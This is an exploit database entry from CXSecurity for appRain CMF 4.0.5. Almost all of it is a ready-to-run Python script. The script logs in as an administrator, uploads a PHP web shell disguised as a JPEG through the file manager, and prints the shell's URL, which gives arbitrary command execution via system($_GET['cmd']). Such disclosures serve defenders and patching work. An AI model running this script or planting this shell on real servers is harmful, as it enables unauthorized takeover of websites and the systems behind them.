---
title: appRain CMF 4.0.5 Shell Upload
url: https://cxsecurity.com/issue/WLB-2024060020
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2024-06-08
fetch_date: 2025-10-06T16:54:30.547675
---

# appRain CMF 4.0.5 Shell Upload

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **appRain CMF 4.0.5 Shell Upload** **2024.06.07**  Credit:  **[Ahmet Umit Bayram](https://cxsecurity.com/author/Ahmet%2BUmit%2BBayram/1/)**  Risk: **High**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **[CWE-264](https://cxsecurity.com/cwe/CWE-264 "Click to see CWE-264")** | |

# Exploit Title: appRain CMF 4.0.5 - Remote Code Execution (RCE) (Authenticated)
# Date: 04/28/2024
# Exploit Author: Ahmet Ümit BAYRAM
# Vendor Homepage: https://www.apprain.org
# Software Link:
https://github.com/apprain/apprain/archive/refs/tags/v4.0.5.zip
# Version: latest
# Tested on: MacOS
import requests
import sys
import time
import random
import string
def generate\_filename():
""" Generate a 5-character random string for filename. """
return ''.join(random.choices(string.ascii\_lowercase, k=5)) + ".inc"
def login(site, username, password):
print("Logging in...")
time.sleep(2)
login\_url = f"https://{site}/admin/system"
session = requests.Session()
login\_data = {
'data[Admin][admin\_id]': username,
'data[Admin][admin\_password]': password
}
headers = {
'Content-Type': 'application/x-www-form-urlencoded'
}
response = session.post(login\_url, data=login\_data, headers=headers)
if "Logout" in response.text:
print("Login Successful!")
return session
else:
print("Login Failed!")
sys.exit()
def upload\_shell(session, site):
print("Shell preparing...")
time.sleep(2)
filename = generate\_filename()
upload\_url = f"https://{site}/admin/filemanager/upload"
files = {
'data[filemanager][image]': (filename, "<html><body><form method='GET'
name='<?php echo basename($\_SERVER['PHP\_SELF']); ?>'><input type='TEXT'
name='cmd' autofocus id='cmd' size='80'><input type='SUBMIT'
value='Execute'></form><pre><?php if(isset($\_GET['cmd'])){
system($\_GET['cmd']); } ?></pre></body></html>", 'image/jpeg')
}
data = {
'submit': 'Upload'
}
response = session.post(upload\_url, files=files, data=data)
if response.status\_code == 200 and "uploaded successfully" in response.text:
print(f"Your Shell is Ready: https://{site}/uploads/filemanager/{filename}")
else:
print("Exploit Failed!")
sys.exit()
if \_\_name\_\_ == "\_\_main\_\_":
print("Exploiting...")
time.sleep(2)
if len(sys.argv) != 4:
print("Usage: python exploit.py sitename.com username password")
sys.exit()
site = sys.argv[1]
username = sys.argv[2]
password = sys.argv[3]
session = login(site, username, password)
upload\_shell(session, site)

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2024060020)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top